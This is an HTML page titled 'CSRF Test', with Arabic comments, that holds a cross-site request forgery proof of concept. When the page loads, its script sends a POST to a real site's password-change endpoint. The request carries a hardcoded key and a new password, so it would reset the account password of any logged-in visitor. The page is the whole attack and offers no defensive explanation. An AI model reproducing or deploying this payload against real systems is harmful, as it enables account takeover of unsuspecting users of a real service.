<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Test</title>
</head>
<body>
    <h1>CSRF Test</h1>
    <script>
        // الطلب يتم إرساله بنفس الدومين الذي يحتوي على الكوكيز
        fetch("https://www.sarhne.com/ajax/user/change_password.html", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify({
                k: "wZ39i63cZmRZKd1ZoXrFELv", // مفتاح الأمان المطلوب
                p: "mm908090mm*" // كلمة المرور الجديدة
            }),
            mode: "no-cors" // Set no-cors mode
        })
        .then(response => console.log("Response:", response))
        .catch(error => console.error('Error:', error));
    </script>
</body>
</html>
